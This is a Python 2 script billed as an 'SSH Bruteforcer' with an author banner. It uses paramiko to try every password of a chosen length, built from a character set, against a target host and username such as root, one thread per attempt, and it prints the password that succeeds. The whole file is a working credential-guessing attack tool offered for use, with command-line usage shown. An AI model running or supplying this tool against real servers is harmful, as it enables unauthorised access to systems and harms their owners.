import thread
import time
from threading import Thread
import sys, os, threading, time, traceback, getopt

import itertools
import paramiko
import terminal

global adx
global port

adx = "1"
port = 22
data = []

term = terminal.TerminalController()
paramiko.util.log_to_file('demo.log')

print "\n************************************"
print "*    SSH Bruteforcer Ver. 0.1       *"
print "* Create by Pamungkas Jayuda        *"
print "* Thinkbuntu                        *"
print "* yulius.jayuda@gmail.com           *"
print "*************************************\n"


def usage():
    print "Usage: genPass.py options \n"
    print "       -h: destination host\n"
    print "       -u: username to force\n"
    print "       -d: password file \n"
    print "       -l: lenght password \n"
    print "Example: python genPass.py -h 192.168.1.55 -u root -d abcdefg12345 \n"
    sys.exit()


class force(Thread):
    def __init__(self, name):
        Thread.__init__(self)
        self.name = name

    def run(self):
        passw = self.name.split("\n")[0]
        t = paramiko.Transport(hostname)
        try:
            t.start_client()
        except Exception:
            x = 0
        except KeyboardInterrupt:
            print "Attack suspended by user..\n"
            sys.exit()

        try:
            t.auth_password(username=username, password=passw)
        except Exception:
            x = 0
        except KeyboardInterrupt:
            print "Attack suspended by user..\n"
            sys.exit()

        if t.is_authenticated():
            print term.DOWN + term.GREEN + "Auth Found: " + passw
            t.close()
            sys.exit()
        else:
            print "Exec Failed: " + passw + "\n"
            t.close()

def execBrute(names, lenght):
    while len(names):
        try:
            gen = itertools.combinations_with_replacement(names, lenght)
            for password in gen:
                thread = force("".join(password))
                thread.start()
            sys.exit()
        except KeyboardInterrupt:
            print "Attack suspended by user..\n"
            sys.exit()

def initUser(argv):
    global th
    global hostname
    global username

    if len(sys.argv) < 3:
        usage()
    try:
        opts, args = getopt.getopt(argv, "h:u:d:l:")
    except getopt.GetoptError:
        usage()

    for opt, arg in opts:
        if opt == '-u':
            username = arg
        elif opt == '-h':
            hostname = arg
        elif opt == '-d':
            password = arg
        elif opt == '-l':
            lenght = arg

    try:
        print "HOST: " + hostname + " Username: " + username + " Password file: " + password
        print "==========================================================================="
        print "Trying password...\n"
        starttime = time.clock()
        execBrute(password, int(lenght))
        stoptime = time.clock()
        print "\nTimes Init: " + str(starttime) + " End: " + str(stoptime)
        print "\n"
    except Exception:
        print Exception




if __name__ == "__main__":
    try:
        initUser(sys.argv[1:])
    except KeyboardInterrupt:
        print "Attack suspended by user...\n"
        sys.exit()
